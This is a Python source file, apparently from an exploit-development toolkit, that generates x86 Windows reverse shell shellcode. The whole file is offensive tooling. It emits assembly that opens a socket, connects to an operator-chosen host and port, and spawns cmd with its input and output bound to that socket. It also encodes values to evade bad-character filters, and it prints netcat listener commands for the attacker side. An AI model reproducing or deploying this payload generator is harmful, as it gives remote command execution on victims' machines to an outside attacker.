"""Reverse shell payload template.

Requires: LoadLibraryA, WSAStartup, WSASocketA, connect, CreateProcessA
Variables: socket_handle
Strings: cmd (mov method, pre-built at slot)
"""
from __future__ import annotations

import socket
import struct

from .base import PayloadTemplate, TemplateConfig
from ..encode import (
    encode_dword, encode_word, safe_push_word_as_dword,
    safe_push_imm, safe_dword_store, safe_word_store,
    parse_ebp_offset, safe_lea, safe_mem_load, safe_mem_store,
    safe_push_mem, safe_call_mem,
)


class ReverseShellTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        ip_le = struct.unpack("<I", socket.inet_aton(config.lhost))[0]
        port_be = socket.htons(config.lport)
        bc = config.badchars

        wsa_start_off = -layout.slot("WSAStartup").offset
        wsa_sock_off  = -layout.slot("WSASocketA").offset
        conn_off      = -layout.slot("connect").offset
        cpa_off       = -layout.slot("CreateProcessA").offset
        sock_h_off    = -layout.slot("socket_handle").offset
        wsadata_off   = -layout.slot("WSADATA").offset
        sockaddr_off  = -layout.slot("sockaddr_in").offset
        si_off        = -layout.slot("STARTUPINFOA").offset
        pi_off        = -layout.slot("PROCESS_INFORMATION").offset
        cmd_off       = -layout.slot("cmd").offset

        return "\n".join([
            "; -- Reverse Shell Payload --",
            f"; Target: {config.lhost}:{config.lport}",
            "",
            "    ; WSAStartup(0x0202, &WSADATA)",
            *safe_lea("esi", "ebp", wsadata_off, bc),
            "    push esi                    ; lpWSAData",
            *safe_push_word_as_dword(0x0202, bc),
            *safe_call_mem("ebp", wsa_start_off, bc),
            "",
            "    ; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL)",
            "    xor  eax, eax",
            "    push eax                    ; dwFlags = NULL",
            "    push eax                    ; g = NULL",
            "    push eax                    ; lpProtocolInfo = NULL",
            "    mov  al, 0x6",
            "    push eax                    ; protocol = IPPROTO_TCP",
            "    sub  al, 0x5",
            "    push eax                    ; type = SOCK_STREAM",
            "    inc  eax",
            "    push eax                    ; af = AF_INET",
            *safe_call_mem("ebp", wsa_sock_off, bc),
            *safe_mem_store("ebp", sock_h_off, "eax", bc),
            "    ; save SOCKET handle",
            "",
            "    ; Set STARTUPINFOA stdio handles to socket",
            *safe_mem_load("eax", "ebp", sock_h_off, bc),
            *safe_lea("edi", "ebp", si_off, bc),
            *safe_dword_store("edi", 0x38, "eax", bc, tmp="ecx"),
            "    ; hStdInput",
            *safe_dword_store("edi", 0x3c, "eax", bc, tmp="ecx"),
            "    ; hStdOutput",
            *safe_dword_store("edi", 0x40, "eax", bc, tmp="ecx"),
            "    ; hStdError",
            "",
            "    ; Set sockaddr_in address and port",
            *safe_lea("edi", "ebp", sockaddr_off, bc),
            "    xor  eax, eax",
            *encode_word(port_be, bc, "ax"),
            *safe_word_store("edi", 0x02, "ax", bc, tmp="ecx"),
            "    ; sin_port (big-endian)",
            *encode_dword(ip_le, bc, "eax"),
            *safe_dword_store("edi", 0x04, "eax", bc, tmp="ecx"),
            "    ; sin_addr (network order)",
            "",
            "    ; connect(socket, &sockaddr_in, 0x10)",
            *safe_lea("eax", "ebp", sockaddr_off, bc),
            *safe_push_imm(0x10, bc),
            "    ; namelen",
            "    push eax                    ; name = &sockaddr_in",
            *safe_push_mem("ebp", sock_h_off, bc),
            "    ; socket handle",
            *safe_call_mem("ebp", conn_off, bc),
            "",
            "    ; CreateProcessA(NULL, &cmd, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)",
            *safe_lea("esi", "ebp", cmd_off, bc),
            *safe_lea("edi", "ebp", si_off, bc),
            *safe_lea("ebx", "ebp", pi_off, bc),
            "    xor  eax, eax",
            "    push ebx                    ; lpProcessInformation",
            "    push edi                    ; lpStartupInfo",
            "    push eax                    ; lpCurrentDirectory = NULL",
            "    push eax                    ; lpEnvironment = NULL",
            "    push eax                    ; dwCreationFlags = NULL",
            "    inc  eax",
            "    push eax                    ; bInheritHandles = TRUE",
            "    xor  eax, eax",
            "    push eax                    ; lpThreadAttributes = NULL",
            "    push eax                    ; lpProcessAttributes = NULL",
            "    push esi                    ; lpCommandLine = &cmd",
            "    push eax                    ; lpApplicationName = NULL",
            *safe_call_mem("ebp", cpa_off, bc),
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Start netcat listener", f"nc -lnvp {config.lport}"),
            ("Start listener (rlwrap)", f"rlwrap nc -lnvp {config.lport}"),
        ]
